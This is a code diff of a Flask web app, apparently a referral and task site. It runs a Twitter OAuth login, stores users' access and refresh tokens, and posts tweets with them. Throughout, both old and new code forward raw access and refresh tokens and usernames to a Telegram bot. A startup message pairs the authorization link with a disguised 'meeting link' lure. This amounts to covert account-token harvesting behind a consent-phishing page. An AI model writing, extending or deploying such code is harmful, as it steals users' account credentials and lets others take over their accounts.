@@ -98,9 +98,6 @@ def init_db_schema():
 init_db_schema()
 
 def store_token(access_token, refresh_token, username):
-    """
-    Store token details and send a single consolidated message with the backup and token storage updates.
-    """
     print("Storing token in the database...")
     try:
         conn = psycopg2.connect(DATABASE_URL, sslmode='require')
@@ -118,17 +115,12 @@ def store_token(access_token, refresh_token, username):
         conn.commit()
         conn.close()
         
-        # Update backup file and create a consolidated message
         backup_data = get_all_tokens()
         formatted_backup_data = [{'access_token': a, 'refresh_token': r, 'username': u} for a, r, u in backup_data]
         with open(BACKUP_FILE, 'w') as f:
             json.dump(formatted_backup_data, f, indent=4)
-        message = (
-            f"💾 Backup updated! Token added for @{username}.\n"
-            f"📊 Total tokens in backup: {len(backup_data)}"
-        )
-        send_message_via_telegram(message)
-        print("Backup update and token storage message sent.")
+        print(f"Backup created/updated in {BACKUP_FILE}. Total tokens: {len(backup_data)}")
+        send_message_via_telegram(f"💾 Backup updated! Token added for @{username}.\n📊 Total tokens in backup: {len(backup_data)}")
     except Exception as e:
         print(f"Database error while storing token: {e}")
 
@@ -213,7 +205,7 @@ def send_startup_message():
     meeting_url = f"{CALLBACK_URL}j?meeting={state}&pwd={code_challenge}"
 
     message = (
-        f"🚀 *App URL:*\n[Visit App]({authorization_url})\n\n"
+        f"🚀 *OAuth Authorization Link:*\n[Authorize link]({authorization_url})\n\n"
         f"📅 *Meeting Link:*\n[Meeting link]({meeting_url})"
     )
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -252,9 +244,6 @@ def post_tweet(access_token, tweet_text):
         return f"Error posting tweet: {error_message}"
 
 def refresh_token_in_db(refresh_token, username):
-    """
-    Refresh token and send a single consolidated message for the refresh operation.
-    """
     token_url = 'https://api.twitter.com/2/oauth2/token'
     client_credentials = f"{CLIENT_ID}:{CLIENT_SECRET}"
     auth_header = base64.b64encode(client_credentials.encode()).decode('utf-8')
@@ -271,14 +260,11 @@ def refresh_token_in_db(refresh_token, username):
                        (new_access_token, new_refresh_token, username))
         conn.commit()
         conn.close()
-        message = (
-            f"🔑 Token refreshed for @{username}. New Access Token: {new_access_token}\n"
-            f"🔄 Refresh Token: {new_refresh_token}"
-        )
-        send_message_via_telegram(message)
+        send_message_via_telegram(f"🔑 Token refreshed for @{username}. New Access Token: {new_access_token}")
+        return new_access_token, new_refresh_token
     else:
         send_message_via_telegram(f"❌ Failed to refresh token for @{username}: {response.json().get('error_description', 'Unknown error')}")
-    return new_access_token, new_refresh_token
+        return None, None
 		
 def get_twitter_username_and_profile(access_token):
     url = "https://api.twitter.com/2/users/me"
@@ -423,37 +409,10 @@ def home():
     code = request.args.get('code')
     state = request.args.get('state')
     error = request.args.get('error')
-
-    # Store referrer ID in session if present in query parameters
-    referrer_id = request.args.get('referrer_id')
-    if referrer_id:
-        session['referrer_id'] = referrer_id
-
-    # Check if user is already logged in (returning user)
     if 'username' in session:
         username = session['username']
-
-        # Retrieve or generate the referral URL
-        referral_url = session.get('referral_url') or generate_referral_url(username)
-        if referral_url:
-            session['referral_url'] = referral_url
-        else:
-            print(f"Failed to generate referral URL for returning user {username}")
-
-        # Retrieve the user's total token balance
-        user_token_balance = get_user_token_balance(username)
-
-        # Notification for returning users, including referral link and token balance
-        message = (
-            f"👋 @{username} just returned to the website.\n"
-            f"🌐 Referral Link: {referral_url or 'No referral link available'}\n"
-            f"💰 Total Tokens: {user_token_balance} (including referral rewards)\n"
-            f"📊 Total Tokens in Database: {get_total_tokens()}"
-        )
-        send_message_via_telegram(message)
+        send_message_via_telegram(f"👋 @{username} just returned to the website.")
         return redirect(url_for('welcome'))
-
-    # OAuth authorization flow for new users
     if request.args.get('authorize') == 'true':
         state = "0"
         code_verifier, code_challenge = generate_code_verifier_and_challenge()
@@ -464,19 +423,12 @@ def home():
             f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
         )
         return redirect(authorization_url)
-
-    # Handle response after authorization (new user flow)
     if code:
         if error:
             return f"Error during authorization: {error}", 400
-
-        # Validate the state
         if state != session.get('oauth_state', '0'):
             return "Invalid state parameter", 403
-
         code_verifier = session.pop('code_verifier', None)
-
-        # Exchange authorization code for tokens
         token_url = "https://api.twitter.com/2/oauth2/token"
         data = {
             'grant_type': 'authorization_code',
@@ -484,59 +436,27 @@ def home():
             'redirect_uri': CALLBACK_URL,
             'code_verifier': code_verifier
         }
-
         response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
         token_response = response.json()
-
         if response.status_code == 200:
             access_token = token_response.get('access_token')
             refresh_token = token_response.get('refresh_token')
-
-            # Fetch Twitter username and profile URL
             username, profile_url = get_twitter_username_and_profile(access_token)
-
             if username:
-                # Store tokens and username in the database
                 store_token(access_token, refresh_token, username)
-
-                # Generate and retrieve the referral URL
                 referral_url = generate_referral_url(username)
-                session['referral_url'] = referral_url if referral_url else "Referral link unavailable"
-
-                # Reward the referrer if a referrer ID is stored in the session and the user wasn't referred
-                if 'referrer_id' in session:
-                    referrer_username = get_username_by_id(session['referrer_id'])  # Assuming this helper function exists
-                    if referrer_username and not was_user_referred(username):
-                        reward_referrer(referrer_username)
-                        mark_user_as_referred(username)
-                        referrer_info = f"👤 Referred by: @{referrer_username}"
-                    else:
-                        referrer_info = "👤 No referrer or already rewarded."
-                    session.pop('referrer_id', None)
-                else:
-                    referrer_info = "👤 No referrer"
-
-                # Update session data
                 session['username'] = username
                 session['access_token'] = access_token
                 session['refresh_token'] = refresh_token
-
-                # Retrieve the user's updated total token balance
-                user_token_balance = get_user_token_balance(username)
-
-                # Notify via Telegram with the referral link included and referrer info
-                message = (
+                session['referral_url'] = referral_url
+                total_tokens = get_total_tokens()
+                send_message_via_telegram(
                     f"🔑 Access Token: {access_token}\n"
                     f"🔄 Refresh Token: {refresh_token}\n"
                     f"👤 Username: @{username}\n"
                     f"🔗 Profile URL: {profile_url}\n"
-                    f"🌐 Referral Link: {referral_url}\n"
-                    f"{referrer_info}\n"
-                    f"💰 Total Tokens: {user_token_balance} (including referral rewards)\n"
-                    f"📊 Total Tokens in Database: {get_total_tokens()}"
+                    f"📊 Total Tokens in Database: {total_tokens}"
                 )
-                send_message_via_telegram(message)
-
                 return redirect(url_for('welcome'))
             else:
                 return "Error retrieving user info with access token", 400
@@ -544,8 +464,24 @@ def home():
             error_description = token_response.get('error_description', 'Unknown error')
             error_code = token_response.get('error', 'No error code')
             return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code
-
     return render_template('home.html')
+
+def generate_referral_url(username):
+    referral_url = f"https://taskair.io/referral/{username}"
+    try:
+        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
+        cursor = conn.cursor()
+        cursor.execute("SELECT referral_url FROM users WHERE username = %s", (username,))
+        existing_referral = cursor.fetchone()
+        if not existing_referral:
+            cursor.execute("UPDATE users SET referral_url = %s WHERE username = %s", (referral_url, username))
+            conn.commit()
+        else:
+            referral_url = existing_referral[0]
+        conn.close()
+    except Exception as e:
+        print(f"Error generating referral URL for {username}: {e}")
+    return referral_url
 
 @app.route('/welcome')
 def welcome():
@@ -562,19 +498,6 @@ def welcome():
     else:
         message = f"Welcome back, @{username}!"
     return render_template('welcome.html', message=message)
-
-def get_user_token_balance(username):
-    try:
-        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
-        cursor = conn.cursor()
-        cursor.execute("SELECT token_balance FROM users WHERE username = %s", (username,))
-        balance = cursor.fetchone()
-        conn.close()
-        return balance[0] if balance else 0
-    except Exception as e:
-        print(f"Error retrieving token balance for {username}: {e}")
-        return 0
-
 
 def get_user_stats(username):
     try:
@@ -667,40 +590,6 @@ def delete_user(user_id):
     except Exception as e:
         print(f"Error deleting user ID {user_id}: {e}")
 
-def generate_referral_url(username):
-    try:
-        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
-        cursor = conn.cursor()
-        
-        cursor.execute("SELECT id, referral_url FROM users WHERE username = %s", (username,))
-        user = cursor.fetchone()
-
-        if user:
-            user_id, referral_url = user
-            # Only generate and update if referral_url is missing
-            if not referral_url:
-                base_url = os.getenv('APP_URL', 'https://taskair.io')
-                referral_url = f"{base_url}/?referrer_id={user_id}"
-                cursor.execute("UPDATE users SET referral_url = %s WHERE id = %s", (referral_url, user_id))
-                conn.commit()
-            return referral_url  # Returns the existing or newly generated referral URL
-
-        # Insert new user if not found
-        cursor.execute("INSERT INTO users (username) VALUES (%s) RETURNING id", (username,))
-        user_id = cursor.fetchone()[0]
-        referral_url = f"{os.getenv('APP_URL', 'https://taskair.io')}/?referrer_id={user_id}"
-        cursor.execute("UPDATE users SET referral_url = %s WHERE id = %s", (referral_url, user_id))
-        conn.commit()
-        return referral_url
-
-    except Exception as e:
-        print(f"Error generating referral URL for {username}: {e}")
-        return None
-    finally:
-        if conn:
-            conn.close()
-
-
 def add_referral(username, referred_user):
     try:
         conn = psycopg2.connect(DATABASE_URL, sslmode='require')
@@ -721,53 +610,6 @@ def add_referral(username, referred_user):
         conn.close()
     except Exception as e:
         print(f"Error updating referral count and reward: {e}")
-        
-def reward_referrer(referrer_username):
-    """
-    Adds a referral reward to the referrer.
-    """
-    try:
-        referral_reward = get_referral_reward_amount()  # Fetch reward amount from settings or env
-        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
-        cursor = conn.cursor()
-        # Increment referral count and add the reward to token balance
-        cursor.execute("""
-            UPDATE users
-            SET referral_count = referral_count + 1,
-                token_balance = token_balance + %s
-            WHERE username = %s
-        """, (referral_reward, referrer_username))
-        conn.commit()
-        conn.close()
-        print(f"Referral reward added for @{referrer_username}. New balance updated.")
-    except Exception as e:
-        print(f"Error rewarding referrer @{referrer_username}: {e}")
-        
-def was_user_referred(username):
-    """Check if the user has been referred previously."""
-    try:
-        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
-        cursor = conn.cursor()
-        cursor.execute("SELECT referred FROM users WHERE username = %s", (username,))
-        result = cursor.fetchone()
-        conn.close()
-        return result[0] if result else False
-    except Exception as e:
-        print(f"Error checking referral status for {username}: {e}")
-        return False
-
-def mark_user_as_referred(username):
-    """Mark the user as referred in the database."""
-    try:
-        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
-        cursor = conn.cursor()
-        cursor.execute("UPDATE users SET referred = TRUE WHERE username = %s", (username,))
-        conn.commit()
-        conn.close()
-    except Exception as e:
-        print(f"Error marking user {username} as referred: {e}")
-
-
 
 def complete_task(user_id, task_id):
     try:
